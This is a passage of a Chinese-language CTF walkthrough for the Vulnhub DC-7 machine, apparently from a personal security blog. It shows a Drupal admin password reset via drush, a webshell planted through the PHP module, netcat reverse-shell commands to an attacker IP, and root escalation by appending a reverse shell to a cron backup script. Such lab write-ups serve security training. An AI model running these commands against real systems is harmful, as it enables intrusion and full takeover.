more <span class=\"hljs-keyword\">in</span>-depth on how to use <span class=\"hljs-keyword\">and</span> extend drush.\n\nExamples:\n drush                                     <span class=\"hljs-type\">List</span> <span class=\"hljs-built_in\">all</span> commands.                                     \n drush --<span class=\"hljs-built_in\">filter</span>=devel_generate             Show only commands defined <span class=\"hljs-keyword\">in</span> devel_generate.drush.inc \n drush <span class=\"hljs-built_in\">help</span> pm-download                    Show <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> one command.                             \n drush <span class=\"hljs-built_in\">help</span> dl                             Show <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> one command using an alias.              \n drush <span class=\"hljs-built_in\">help</span> --<span class=\"hljs-built_in\">format</span>=html                  Show an HTML page detailing <span class=\"hljs-built_in\">all</span> available commands.    \n drush <span class=\"hljs-built_in\">help</span> --<span class=\"hljs-built_in\">format</span>=json                  All available comamnds, <span class=\"hljs-keyword\">in</span> a machine parseable <span class=\"hljs-built_in\">format</span>.\n\nArguments:\n command                                   A command name, <span class=\"hljs-keyword\">or</span> command alias.\n\nOptions:\n --field-labels                            Add field labels before first line of data. Default <span class=\"hljs-keyword\">is</span> on; use --no-field-labels to disable.                               \n --fields=&#x3C;name, description>              Fields to output. All available fields are: name, description.                                                             \n --<span class=\"hljs-built_in\">filter</span>=[category]                       Restrict command <span class=\"hljs-built_in\">list</span> to those commands defined <span class=\"hljs-keyword\">in</span> the specified file. Omit value to choose <span class=\"hljs-keyword\">from</span> a <span class=\"hljs-built_in\">list</span> of names.          \n --<span class=\"hljs-built_in\">format</span>=&#x3C;json>                           Select output <span class=\"hljs-built_in\">format</span>. Available: table, csv, html, json, <span class=\"hljs-built_in\">list</span>, var_export, yaml. Default <span class=\"hljs-keyword\">is</span> table.                         \n --sort                                    Sort commands <span class=\"hljs-keyword\">in</span> alphabetical order. Drush waits <span class=\"hljs-keyword\">for</span> full bootstrap before printing <span class=\"hljs-built_in\">any</span> commands when this option <span class=\"hljs-keyword\">is</span> used.\n\nTopics:\n docs-readme                               README.md                                    \n docs-output-formats                       Output formatting options selection <span class=\"hljs-keyword\">and</span> use.\n</code></pre>\n<p>查看一下文档 ：<a href=\"https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html\">https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html</a></p>\n<p>找到 ： <code>user-password</code> 为具有指定名称的用户账户设置或重置密码</p>\n<p>可以修改用户密码，可以尝试修改<code>admin</code>用户的密码</p>\n<pre><code class=\"hljs language-python\"> drush user-password USERNAME --password=<span class=\"hljs-string\">\"SOMEPASSWORD\"</span>\n</code></pre>\n<p>修改成功，修改前记得切换目录到<code>Drupal</code></p>\n<pre><code class=\"hljs language-python\">dc7user@dc-<span class=\"hljs-number\">7</span>:/var/www/html$ drush user-password admin --password=<span class=\"hljs-string\">\"123456\"</span>\nChanged password <span class=\"hljs-keyword\">for</span> admin  \n</code></pre>\n</li>\n</ol>\n<h2>后台getshell</h2>\n<ol>\n<li>\n<p>登陆后台，寻找可利用的点</p>\n<p><img src=\"/post-images/VulnhubDC-7/image37.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>本来想直接修改**<code>Welcome to DC-7</code>** 的内容为一句话木马，但是发现没有解析，百度后知道<code>Drupal</code>为了安全将<code>PHP</code>独立为了一个模块，下面是模块链接🔗</p>\n<p><a href=\"https://www.drupal.org/project/php\">https://www.drupal.org/project/php</a></p>\n</li>\n<li>\n<p>然后在<code>Extend</code>安装该拓展，前提是<code>Update Manager</code>安装了</p>\n<ul>\n<li>\n<p>检查<code>Update Manager</code> 是否安装了</p>\n<p><img src=\"/post-images/VulnhubDC-7/image38.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>然后<code>Extend</code> 安装下载的拓展</p>\n<p>安装后选择 开启该模块</p>\n<p><img src=\"/post-images/VulnhubDC-7/image39.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/VulnhubDC-7/image40.png\" alt=\"image.png\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>安装完后，我们来到 <code>Content</code> 选项，选择**<code>Welcome to DC-7</code>** edit编辑</p>\n<p><img src=\"/post-images/VulnhubDC-7/image41.png\" alt=\"image.png\"></p>\n<p>内容改为一句木马，然后内容格式化改为<code>php</code> ，然后保存</p>\n</li>\n<li>\n<p>保存后复制页面链接使用蚁🗡连接，然后使用蚁🗡反弹<code>shell</code></p>\n<pre><code class=\"hljs language-python\">(www-data:/var/www/html) $ nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> <span class=\"hljs-number\">1234</span> -e /<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<p>获得<code>www-data</code>的<code>shell</code></p>\n<pre><code class=\"hljs language-python\">whoami\nwww-data\n</code></pre>\n</li>\n<li>\n<p>我们知道<code>backups.sh</code>脚本属主为<code>root</code>，属组为<code>www-data</code> ，回到<code>backups.sh</code>的目录，将反弹<code>shell</code>语句插入脚本</p>\n<pre><code class=\"hljs language-python\">echo <span class=\"hljs-string\">\"nc 192.168.75.151 1233 -e /bin/bash\"</span> >> backups.sh\n</code></pre>\n<p>插入后等待任务自动执行，就能获得<code>root</code>的权限了</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1233</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1233</span> ...\n\n<span class=\"hljs-built_in\">id</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>] <span class=\"hljs-number\">54920</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># cat theflag.txt</span>\n\n<span class=\"hljs-number\">888</span>       <span class=\"hljs-number\">888</span>          <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      8888888b.                             <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> \n<span class=\"hljs-number\">888</span>   o   <span class=\"hljs-number\">888</span>          <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>  <span class=\"hljs-string\">\"Y88b                            888 888 888 888 \n888  d8b  888          888 888      888    888                            888 888 888 888 \n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 \n888d88888b888 d8P  Y8b 888 888      888    888 d88\"</span><span class=\"hljs-string\">\"88b 888 \"</span>88b d8P  Y8b <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> \n88888P Y88888 <span class=\"hljs-number\">88888888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>    <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">88888888</span> Y8P Y8P Y8P Y8P \n8888P   Y8888 Y8b.     <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>  .d88P Y88.<span class=\"hljs-number\">.88</span>P <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> Y8b.      <span class=\"hljs-string\">\"   \"</span>   <span class=\"hljs-string\">\"   \"</span>  \n888P     Y888  <span class=\"hljs-string\">\"Y8888  888 888      8888888P\"</span>   <span class=\"hljs-string\">\"Y88P\"</span>  <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span>  <span class=\"hljs-string\">\"Y8888  888 888 888 888 \n\nCongratulations!!!\n\nHope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and all those who have taken the time to complete these little\nchallenges.\n\nI'm sending out an especially big thanks to:\n\n@4nqr34z\n@D4mianWayne\n@0xmzfr\n@theart42\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n</span></code></pre>\n</li>\n</ol>","title":"Vulnhub - DC-7","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC 7 https://www.vulnhub.com/entry/dc 7,356/ 端口扫描主机发现 1. 探测存活主机，178是靶机 2. 探测主机所有开放端口 3. 探测服务版本以及系统版本 4. 扫描漏洞 web渗透 1. 访问页面，发现是 DrupalCMS 2. 爆破目录看看，好像没..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}